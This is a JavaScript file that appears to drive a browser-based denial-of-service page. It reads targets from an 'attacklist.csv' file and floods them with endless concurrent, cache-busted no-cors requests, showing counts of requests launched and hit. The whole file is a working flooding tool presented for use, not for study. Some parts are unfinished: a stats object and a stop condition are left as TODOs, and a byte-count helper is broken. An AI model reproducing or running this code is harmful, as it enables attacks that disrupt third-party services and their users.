(function () {
  var elements = {
    btn: document.getElementById("btnAction"),
    counter: document.getElementById("txtCounter"),
  };

  var counter = {
    total: 0,
    hit: 0,
  };

  var stats = {
    // TODO
  }

  function refreshCounter() {
    elements.counter.innerHTML = `Launched: <strong>${counter.total}</strong>, Hit: <strong>${counter.hit}</strong>`;
  }

  window.getTargets = function (cb) {
    fetch("/attacklist.csv").then((res) => {
      res.text().then((list) => {
        const targets = list
          .split("\n")
          .slice(1)
          .filter((i) => !!i)
          .map((i) => {
            const row = i.split(",");
            return {
              title: row[0],
              method: row[1],
              host: row[2],
              port: row[3],
              path: row[4],
            };
          });
        cb(targets);
      });
    });
  };

  const getMaxConcurrent = function () {
    return 10;
  }

  const calcRequestBytes = function (method, uri, body) {
      return method.length 
        + 1
        + uri
        + 'HTTP'
  }

  window.launchCannon = function (bytes, progressCb, done) {
    const maxConcurrent = getMaxConcurrent();

    getTargets(function (targets) {
      function fireRequests() {
        const target = targets[Math.floor(Math.random() * targets.length)];

        function fire() {
          var rand = Math.floor(Math.random() * 1000000) + new Date().getTime();

          counter.total++;
          refreshCounter();

          fetch(`https://${target.host}:${target.port}/${(target.path || '').replace('{rand}', rand)}`, {
            method: target.method || 'GET',
            mode: "no-cors",
          }).finally(function (err) {
            counter.hit++;
            refreshCounter();
            // TODO until done
            fire();
          });
        }

        for (let i = 0; i <= maxConcurrent; i++) {
          fire()
        }
      }

      fireRequests();
    });
  };
})();
